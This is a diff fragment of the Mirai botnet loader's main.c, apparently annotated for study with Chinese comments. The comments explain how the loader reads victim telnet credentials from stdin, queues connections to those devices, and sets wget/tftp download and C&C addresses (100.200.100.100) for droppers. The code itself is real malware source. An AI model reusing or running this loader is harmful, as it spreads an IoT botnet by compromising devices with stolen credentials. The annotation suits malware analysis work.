@@ -55,11 +55,13 @@ int main(int argc, char **args)
 
     if (!binary_init())
     {
-        printf("Failed to load bins/dlr.* as dropper\n");
+        printf("Failed to load bins/dlr.* as dropper\n");   //bins底下的文件实际都是dropper而已，不是真正的payload【所以loader/src是入侵的第一步，第二步是mirai目录下的文件（真正的payload）】
         return 1;
     }
 
-    /*                                                                                   wget address           tftp address */
+    /* wget address tftp address */
+    // 构建mirai(本地)-server(远程C&C)的连接结构体
+    // 192.168.0.1和192.168.1.1 -> 100.200.100.100
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
@@ -73,7 +75,7 @@ int main(int argc, char **args)
     {
         char strbuf[1024];
 
-        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
+        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)  //从标准输入读取telnet的信息（应该是来自上报的victim节点telnet信息）
             break;
 
         util_trim(strbuf);
@@ -85,14 +87,14 @@ int main(int argc, char **args)
         }
 
         memset(&info, 0, sizeof(struct telnet_info));
-        if (telnet_info_parse(strbuf, &info) == NULL)
+        if (telnet_info_parse(strbuf, &info) == NULL)   //解析上报的telnet信息
             printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         else
         {
             if (srv == NULL)
                 printf("srv == NULL 2\n");
 
-            server_queue_telnet(srv, &info);
+            server_queue_telnet(srv, &info);    //尝试连接，并且处理新的节点【将连接成功的fd加入server支持epoll交互池中】
             if (total++ % 1000 == 0)
                 sleep(1);
         }
@@ -102,12 +104,13 @@ int main(int argc, char **args)
 
     printf("Hit end of input.\n");
 
-    while(ATOMIC_GET(&srv->curr_open) > 0)
+    while(ATOMIC_GET(&srv->curr_open) > 0)  //只要当前的conntection数量大于0，就一直循环。无连接就return。
         sleep(1);
 
     return 0;
 }
 
+//打印现在连接的信息情况。
 static void *stats_thread(void *arg)
 {
     uint32_t seconds = 0;
